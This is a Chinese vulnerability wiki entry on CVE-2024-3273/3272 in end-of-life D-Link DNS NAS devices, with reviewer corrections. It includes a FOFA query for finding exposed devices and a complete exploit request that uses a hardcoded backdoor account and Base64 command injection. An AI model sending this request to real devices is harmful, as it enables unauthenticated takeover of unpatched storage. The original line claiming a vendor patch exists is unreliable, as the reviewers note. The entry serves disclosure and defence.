---
cve: "CVE-2024-3273"
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-6afe7539bd832abd1ed670a0"
entity_id: "ve-6afe7539bd832abd1ed670a0"
schema_version: "1"
fofa_unverified: "Text:In order to access the ShareCenter, please make sure you are using a recent browser(I"
title: "D-Link NAS 未授权RCE漏洞(CVE-2024-3273)预警"
product: "D-Link DNS NAS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
identifier_role: "primary"
primary_identifiers: "CVE-2024-3272;CVE-2024-3273"
referenced_identifiers: ""
prerequisites: "列4型号/多个固件；messagebus空密码+system参数"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/D-Link/D-Link%20NAS%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E%28CVE-2024-3273%29.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "recorded"
verification_source: "https://github.com/netsecfish/dlink"
source_url: "https://github.com/netsecfish/dlink"
---

# D-Link NAS 未授权RCE漏洞(CVE-2024-3273)预警

## CVE-2024-3272 技术补充

核对日期：2026-10-03。本文为新增说明，不修改原文、请求或示例；未执行PoC或请求目标。

### 相同端点、两个漏洞

[netsecfish原始研究](https://github.com/netsecfish/dlink)明确两部分：nas_sharing.cgi接受硬编码用户名messagebus及空密码，属于3272；system参数所携带的Base64命令处理属于3273。现有3273文章已同时包含两者，因此3272的编号缺口应补链条关系，不能再复制一篇相同请求。

原研究列DNS-320L、DNS-325、DNS-327L、DNS-340L的具体固件，给出HTTP请求结构，未提供可独立审查的原始响应文字；图片未视检。上游README对影响设备数量的统计不能视为漏洞确认数。

### 修复更正

[D-Link SAP10383](https://supportannouncement.us.dlink.com/security/publication.aspx?name=SAP10383)明确这些设备已EOL/EOS，不再得到安全补丁，建议退役替换。因此旧文“厂商已发布升级补丁”不能保留为现行结论，应在原句之外加注更正。厂商页面的Resolved Status不等于发布了修复固件。

### 静态审阅

已完整读现有请求及原研究文字；请求触发目标命令，不是纯认证探测。Base64为表达方式，不等于无害；没有执行、解码运行或访问示例目标。现有ifconfig测试值保持原样，未修改或脱敏。


<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：D-Link DNS NAS
- 本文讨论：CVE-2024-3273
- 版本、权限与配置前提：列4型号/多个固件；messagebus空密码+system参数
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 与62/71同入口同机制重复；59版本详细但无研究原文
- 断言官方已发补丁却未给版本/公告，须核验EOL状态
- fofa元数据截断；在野已知/影响面广无来源，脚本验证仅图片
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 官方是否提供补丁、版本/利用状态待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

D-Link NAS nas_sharing.cgi接口存在命令执行漏洞，该漏洞存在于“/cgi-bin/nas_sharing.cgi”脚本中，影响其 HTTP GET 请求处理程序组件。漏洞成因是通过硬编码帐户（用户名：“messagebus”和空密码）造成的后门以及通过“system”参数的命令注入问题。未经身份验证的攻击者可利用此漏洞获取服务器权限。

# 影响范围

DNS-320L Version 1.11, Version 1.03.0904.2013, Version 1.01.0702.2013

DNS-325 Version 1.01

DNS-327L Version 1.09, Version 1.00.0409.2013

DNS-340L Version 1.08

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

# 漏洞复现

FOFA："Text:In order to access the ShareCenter, please make sure you are using a recent browser(IE 7+, Firefox 3+, Safari 4+, Chrome 3+, Opera 10+)"

POC/EXP：

```http
GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWZjb25maWc= HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
```


![image-20240409111158628](./.resource/D-LinkNAS未授权RCE漏洞CVE-2024-3273/media/image-20240409111158628.png)


脚本验证

![image-20240409111543669](./.resource/D-LinkNAS未授权RCE漏洞CVE-2024-3273/media/image-20240409111543669.png)


# 修复方案

**官方修复：**

关闭互联网暴露面或接口

目前厂商已发布升级补丁以修复漏洞


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
